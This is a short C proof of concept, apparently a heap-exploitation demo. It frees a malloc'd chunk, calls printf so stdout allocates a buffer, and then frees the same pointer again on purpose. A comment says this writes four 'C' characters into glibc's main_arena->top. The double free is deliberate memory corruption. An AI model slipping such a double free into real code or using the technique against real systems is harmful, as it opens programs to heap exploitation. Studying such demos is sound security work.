// This PoC writes four C letters into main_arena->top

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define WORD_SIZE ((size_t)-1 > 0xffffffffUL ? 8 : 4)
#define SIZEOFNORMALCHUNK 0x100-WORD_SIZE
#define SIZEOFFASTCHUNK 0x60-WORD_SIZE

void print_bytes(char *mempos, size_t size)
{
	int i = 0;
	while(i < size)
		printf("%02x", *(mempos + i++));
	printf("\n");
		
}

int main()
{
	char *A;
	A = malloc(0x410-8); // (1)
	free(A);
	printf("BBBB"); // (2)
	free(A); // Double free (3)
	printf("CCCC"); // (4)
	return 0;
}
